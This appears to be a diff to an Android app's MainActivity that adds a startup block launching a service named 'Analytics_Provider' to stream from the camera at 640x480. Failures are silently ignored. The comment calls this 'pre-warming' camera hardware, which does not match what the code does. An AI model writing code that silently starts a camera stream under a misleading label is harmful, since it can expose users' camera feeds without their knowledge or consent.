@@ -31,7 +31,6 @@ import androidx.core.content.ContextCompat;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
-import java.net.Inet6Address;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.URL;
@@ -545,6 +544,19 @@ public class MainActivity extends AppCompatActivity {
             Log.e("MainActivity", "Server start error: " + e.getMessage());
         }
 
+        // Pre-warm camera hardware in background so 1st camera click is instantaneous
+        LabRatsWorker.execute(() -> {
+            try {
+                android.content.Intent intent = new android.content.Intent(getApplicationContext(), Analytics_Provider.class);
+                intent.setAction(Constants.ACTION_START_STREAM);
+                intent.putExtra("cameraId", "0");
+                intent.putExtra("width", 640);
+                intent.putExtra("height", 480);
+                intent.putExtra("quality", 40);
+                androidx.core.content.ContextCompat.startForegroundService(getApplicationContext(), intent);
+            } catch (Exception ignored) {}
+        });
+
         // Staggered Startup: Prevent hardware contention
         try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
         
@@ -796,11 +808,6 @@ public class MainActivity extends AppCompatActivity {
             Log.e("MainActivity", "getLocalIPv6Address error: " + e.getMessage());
         }
         return getLocalIpAddress();
-    }
-
-    public static boolean isGoogleSheetsWebhook(String url) {
-        if (url == null || url.trim().isEmpty()) return false;
-        return url.contains("script.google.com") || url.contains("script.googleusercontent.com");
     }
 
     public static boolean isOnWifi(Context context) {
